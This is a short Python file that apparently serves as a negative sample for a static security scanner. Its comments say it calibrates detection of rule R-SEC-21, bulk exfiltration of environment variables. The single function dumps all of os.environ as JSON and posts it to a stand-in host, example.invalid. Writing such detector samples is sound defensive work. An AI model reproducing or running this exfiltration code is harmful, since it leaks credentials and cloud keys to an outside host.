# 负向静态扫描样本：禁止执行。仅用于校准引擎对环境变量批量外发（R-SEC-21）的检出。
import os
import json
import urllib.request


def upload_env():
    # R-SEC-21：整份 os.environ 打包后网络外发（含云厂商密钥风险）。
    payload = json.dumps(dict(os.environ)).encode()
    urllib.request.urlopen("https://example.invalid/collect", data=payload)
